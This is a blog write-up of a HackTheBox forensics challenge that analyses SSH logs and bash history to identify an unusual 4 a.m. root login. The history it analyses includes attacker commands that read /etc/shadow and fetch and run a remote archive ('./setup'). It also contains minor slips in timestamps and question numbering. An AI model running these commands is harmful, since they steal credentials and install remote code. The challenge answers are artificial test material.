---
title: "HackTheBox & CyberDefenders"
description: "https://youtu.be/Vbu8maontzU"
draft: false
date: 2026-10-06
tags:
  - Network Forensics
  - Memory Forensics
  - Disk Forensics
categories:
  - Learning
cover: "https://i.pinimg.com/1200x/68/a8/38/68a8382cda827a9e12f0d080ecf81f59.jpg"
banner: "https://i.pinimg.com/1200x/68/a8/38/68a8382cda827a9e12f0d080ecf81f59.jpg"
---

# An unusual sighting
> Platform: HackTheBox (VIP+)
> 
> Difficulty: Very Easy
> 
> "As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come the competition!"

We are presented with `sshd.log`, `bash_history.txt`, and a few questions about it.

`sshd.log`
```text
[2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221.
[2024-01-19 12:59:11] Server listening on :: port 2221.
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
[2024-01-28 15:24:23] Failed publickey for root from 100.72.1.95 port 47721 ssh2: ECDSA SHA256:E5niDfUPHiDYqqgzSsVH_pHw3lKVqGnZT1PDIXoK5sU
[2024-01-28 15:24:33] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:39] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:43] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:43] Connection closed by authenticating user root 100.72.1.95 port 47721 [preauth]
[2024-02-13 11:29:50] Connection from 100.81.51.199 port 63172 on 100.107.36.130 port 2221 rdomain ""
[2024-02-13 11:29:50] Failed publickey for root from 100.81.51.199 port 63172 ssh2: ECDSA SHA256:NdSnAx293507s2KX4LyvIV0gCzzQW5eXyoiiIBosqNE
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
[2024-02-13 11:29:50] Starting session: shell on pts/2 for root from 100.81.51.199 port 63172 id 0
[2024-02-13 11:57:16] syslogin_perform_logout: logout() returned an error
[2024-02-13 11:57:16] Received disconnect from 100.81.51.199 port 63172:11: disconnected by user
[2024-02-13 11:57:16] Disconnected from user root 100.81.51.199 port 63172
[2024-02-15 10:40:47] Connection from 101.111.18.92 port 44711 on 100.107.36.130 port 2221 rdomain ""
[2024-02-15 10:40:48] Failed publickey for softdev from 101.111.18.92 port 44711 ssh2: ECDSA SHA256:TMRAzI8Xehi9UN0Spl5PypfDmgKC_5TDKW01T03k6H0
[2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 10:40:51] Starting session: shell on pts/2 for softdev from 101.111.18.92 port 44711 id 0
[2024-02-15 10:42:20] syslogin_perform_logout: logout() returned an error
[2024-02-15 10:42:20] Received disconnect from 101.111.18.92 port 44711:11: disconnected by user
[2024-02-15 10:42:20] Disconnected from user softdev 101.111.18.92 port 44711
[2024-02-15 18:51:47] Connection from 101.111.18.92 port 44711 on 100.107.36.130 port 2221 rdomain ""
[2024-02-15 18:51:48] Failed publickey for softdev from 101.111.18.92 port 44711 ssh2: ECDSA SHA256:TMRAzI8Xehi9UN0Spl5PypfDmgKC_5TDKW01T03k6H0
[2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 18:51:51] Starting session: shell on pts/2 for softdev from 101.111.18.92 port 44711 id 0
[2024-02-15 18:59:39] syslogin_perform_logout: logout() returned an error
[2024-02-15 18:59:39] Received disconnect from 101.111.18.92 port 44711:11: disconnected by user
[2024-02-15 18:59:39] Disconnected from user softdev 101.111.18.92 port 44711
[2024-02-16 10:26:47] Connection from 100.86.71.224 port 58713 on 100.107.36.130 port 2221 rdomain ""
[2024-02-16 10:26:48] Failed publickey for softdev from 100.86.71.224 port 58713 ssh2: ECDSA SHA256:p2aapGz1SWK8ioSXxVzrvi4qKjpCPLIj2e421Wf4Hk8
[2024-02-16 10:26:50] Accepted password for softdev from 100.86.71.224 port 58713 ssh2
[2024-02-16 10:26:51] Starting session: shell on pts/2 for softdev from 100.86.71.224 port 58713 id 0
[2024-02-16 14:47:28] syslogin_perform_logout: logout() returned an error
[2024-02-16 14:47:28] Received disconnect from 100.86.71.224 port 58713:11: disconnected by user
[2024-02-16 14:47:28] Disconnected from user softdev 100.86.71.224 port 58713
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSS6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071 id 0
[2024-02-19 04:38:17] syslogin_perform_logout: logout() returned an error
[2024-02-19 04:38:17] Received disconnect from 2.67.182.119 port 60071:11: disconnected by user
[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
[2024-02-20 11:10:14] Connection from 100.87.190.253 port 63371 on 100.107.36.130 port 2221 rdomain ""
[2024-02-20 11:10:14] Failed publickey for softdev from 100.87.190.253 port 63371 ssh2: ECDSA SHA256:iT7NDYA0Uut9UYbA7Io5WpsUNO3KzfD5ekgQwDIIED0
[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
[2024-02-20 11:10:14] Starting session: shell on pts/2 for softdev from 100.87.190.253 port 63371 id 0
[2024-02-20 14:58:17] syslogin_perform_logout: logout() returned an error
[2024-02-20 14:58:17] Received disconnect from 100.87.190.253 port 63371:11: disconnected by user
[2024-02-20 14:58:17] Disconnected from user softdev 100.87.190.253 port 63371
[2024-02-21 10:49:47] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-21 10:49:49] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUgvFjg6VwmPSxu7A0
[2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-21 10:49:50] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-21 13:11:14] syslogin_perform_logout: logout() returned an error
[2024-02-21 13:11:14] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-21 13:11:14] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-21 18:17:47] Connection from 100.7.99.129 port 47265 on 100.107.36.130 port 2221 rdomain ""
[2024-02-21 18:17:49] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDklolqWwycTCwWEJyR20ym_jCi2_bZxl6I
```
`bash_history.txt`
```text
[2024-02-13 11:31:01] useradd -mG sudo softdev
[2024-02-13 11:32:12] passwd softdev
[2024-02-13 11:33:13] apt update && apt install wget gpg
[2024-02-13 11:35:01] wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
[2024-02-13 11:36:28] install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg
[2024-02-13 11:37:01] sh -c 'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'
[2024-02-13 11:37:48] apt update && apt install python3 python-is-python3 code git
[2024-02-13 11:38:10] git clone https://git.korp.htb/cmd_dev1.git
[2024-02-13 11:39:10] chown -R softdev:softdev ./dev_project
[2024-02-13 11:40:01] sudo -u softdev python -m venv cms
[2024-02-13 11:40:58] source ./cms/bin/activate
[2024-02-13 11:42:01] python -m pip install -r requirements.txt
[2024-02-13 11:56:01] python ./server.py
[2024-02-15 10:41:51] ps aux | grep "server.py"
[2024-02-15 18:52:01] nvim server.py
[2024-02-15 18:56:01] source ./cms/bin/activate
[2024-02-15 18:57:01] python ./server.py
[2024-02-16 10:28:19] nvim server.py
[2024-02-16 10:28:29] source ./cms/bin/activate
[2024-02-16 12:38:11] python ./server.py --tests
[2024-02-16 14:40:47] python ./server.py --tests
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:30] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:08:17] tar xvf latest.tar.gz
[2024-02-19 04:11:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:10:14] nvim server.py
[2024-02-20 11:48:40] source ./cms/bin/activate
[2024-02-20 11:49:29] python ./server.py --tests
[2024-02-20 13:50:14] python ./server.py --tests
[2024-02-20 14:50:04] python ./server.py --tests
[2024-02-21 10:51:27] sudo apt update
[2024-02-21 10:52:58] sudo apt dist-upgrade
[2024-02-21 18:17:59] code .
[2024-02-22 12:20:29] code .
[2024-02-22 12:19:28] source ./cms/bin/activate
[2024-02-22 12:20:10] python ./server.py --verbose 2>&1 | tee /tmp/server_logs.log
[2024-02-22 17:20:10] python ./server.py --verbose --tests 2>&1 | tee /tmp/server_logs.log
[2024-02-23 10:49:50] source ./cms/bin/activate
[2024-02-23 10:51:19] code .
[2024-02-23 12:50:46] python ./server.py --verbose
[2024-02-23 12:52:01] ps aux | grep "server.py"
[2024-02-23 12:51:19] kill -s SIGUSR1 2561
[2024-02-23 18:04:16] nvim requirements.txt
[2024-02-23 18:19:17] source ./cms/bin/activate
[2024-02-23 18:21:01] python -m pip install -r requirements.txt
[2024-02-24 11:16:08] source ./cms/bin/activate
[2024-02-24 11:17:07] code .
[2024-02-24 13:20:18] python ./server.py --tests
[2024-02-24 14:20:25] python ./server.py --tests
[2024-02-24 14:08:18] sudo apt update && sudo apt dist-upgrade
[2024-02-26 10:00:17] nvim requirements.txt
[2024-02-26 10:20:31] source ./cms/bin/activate
[2024-02-26 10:20:21] python -m pip install -r requirements.txt
[2024-02-26 15:07:18] source ./cms/bin/activate
```

**1. What is the IP Address and Port of the SSH Server?**

> `Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221`

A few side note:
- In network architecture, a server can be conceptualized as a physical facility where the IP address functions as the primary location, and the port number serves as a specific access point or door. The origin of a connection ("from") identifies the visiting entity, whereas the destination ("on") specifies the particular interface that received the request (the server).
- Additionally, the address 0.0.0.0 denotes a binding configuration to all available IPv4 network interfaces concurrently, rather than acting as a unique, host-specific address.

**`Answer: 100.107.36.130:2221`**

**2. What time is the first successful login?**

> `[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199`

Earlier attempts failed, and this is the first one that was accepted.

**`Answer: 2024-02-13 11:29:50`**

**3. What is the time of the unusual login?**

> `[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2`

The unusual login happened at 4 a.m. (outside observed time pattern); using root (the account with full control); and from a different IP.

Note: `[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199` also using root, but in observed time pattern and IP address.

**`Answer: 2024-02-19 04:00:14`**

**4. What is the fingerprint of the attacker's public key?**

Knowing the suspicious login, we would like to find the failed publickey (esp. for root) right after `04:00:14`. They have the same time, username, source IP, and source port. That ties the offered key to the same connection that suspiciously and successfully logged in.

In public-key cryptography, a public key fingerprint is a short sequence of bytes used to identify a longer public key.

> `Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSS6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`

**`Answer: OPkBSS6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`**
 
**5. What is the first command the attacker executed after logging in?**

The attacker successfully logged in at `[2024-02-19 04:00:17]`, and in the bash history we can see `[2024-02-19 04:00:18] whoami`.

**`Answer: whoami`**

**5. What is the first command the attacker executed before logging out?**

The attacker logged out at `[2024-02-19 04:38:17]`, and the last command before that timeline is `./setup`

**`Answer: ./setup`**














